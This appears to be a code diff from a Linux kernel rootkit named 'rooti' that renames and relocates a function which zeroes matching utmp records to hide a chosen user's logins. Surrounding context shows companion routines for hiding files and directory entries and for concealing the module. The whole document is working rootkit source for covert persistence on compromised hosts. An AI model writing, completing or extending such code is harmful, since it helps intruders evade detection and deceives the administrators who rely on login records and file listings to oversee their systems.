@@ -34,36 +34,6 @@ void rooti_showme()
     prev_module = NULL;
 }
 
-int rooti_filter_login_entry(char *user_buf, size_t count, char *name)
-{
-    char *kernel_buf = kmalloc(count, GFP_KERNEL);
-    if (kernel_buf == NULL) {
-        printk(KERN_DEBUG "rooti: failed to allocate memory\n");
-        return -ENOMEM;
-    }
-    int err = copy_from_user(kernel_buf, user_buf, count);
-    if (err > 0) {
-        printk(KERN_DEBUG "rooti: copy_from_user() failed\n");
-        kfree(kernel_buf);
-        return -EFAULT;
-    }
-
-    struct utmp *utmp_buf = (struct utmp *)kernel_buf;
-    if (strncmp(utmp_buf->ut_user, name, UT_NAMESIZE) == 0) {
-        // Match found, fill the buffer with zeros, marking it as invalid
-        memset(kernel_buf, 0, count);
-        err = copy_to_user(user_buf, kernel_buf, count);
-        if (err > 0) {
-            printk(KERN_DEBUG "rooti: copy_to_user() failed\n");
-            kfree(kernel_buf);
-            return -EFAULT;
-        }
-    }
-
-    kfree(kernel_buf);
-    return 0;
-}
-
 static bool rooti_should_hide_file(struct linux_dirent64 *record)
 {
     // Check if the entry's name begins with the prefix of hidden files
@@ -148,4 +118,34 @@ size_t rooti_hide_dir_entries(struct linux_dirent64 *user_buf, size_t count, boo
 
     kfree(kernel_buf);
     return count;
+}
+
+int rooti_hide_login_entry(char *user_buf, size_t count, char *name)
+{
+    char *kernel_buf = kmalloc(count, GFP_KERNEL);
+    if (kernel_buf == NULL) {
+        printk(KERN_DEBUG "rooti: failed to allocate memory\n");
+        return -ENOMEM;
+    }
+    int err = copy_from_user(kernel_buf, user_buf, count);
+    if (err > 0) {
+        printk(KERN_DEBUG "rooti: copy_from_user() failed\n");
+        kfree(kernel_buf);
+        return -EFAULT;
+    }
+
+    struct utmp *utmp_buf = (struct utmp *)kernel_buf;
+    if (strncmp(utmp_buf->ut_user, name, UT_NAMESIZE) == 0) {
+        // Match found, fill the buffer with zeros, marking it as invalid
+        memset(kernel_buf, 0, count);
+        err = copy_to_user(user_buf, kernel_buf, count);
+        if (err > 0) {
+            printk(KERN_DEBUG "rooti: copy_to_user() failed\n");
+            kfree(kernel_buf);
+            return -EFAULT;
+        }
+    }
+
+    kfree(kernel_buf);
+    return 0;
 }
